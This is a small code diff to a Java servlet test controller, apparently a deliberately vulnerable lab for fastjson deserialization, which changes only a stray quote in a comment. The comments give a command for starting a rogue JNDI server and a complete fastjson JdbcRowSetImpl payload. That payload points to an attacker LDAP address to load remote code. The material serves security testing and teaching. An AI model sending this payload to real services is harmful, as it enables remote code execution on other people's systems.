@@ -29,7 +29,7 @@ public class TestController extends HttpServlet {
 /****************************************************fastjson反序列化漏洞**********************************************************************/
     /**
      * 启动rmi服务：java -jar RogueJndi-1.0.jar -n 起服务的ip -c 要执行的命令
-     * payload：{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://192.168.83.11:1389/o=tomcat","autoCommit":true}}";
+     * payload：{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://192.168.83.11:1389/o=tomcat","autoCommit":true}}
      * 如果是get请求就编码（HTML）payload，POST则不用
      **/
     @RequestMapping(value = "/test")
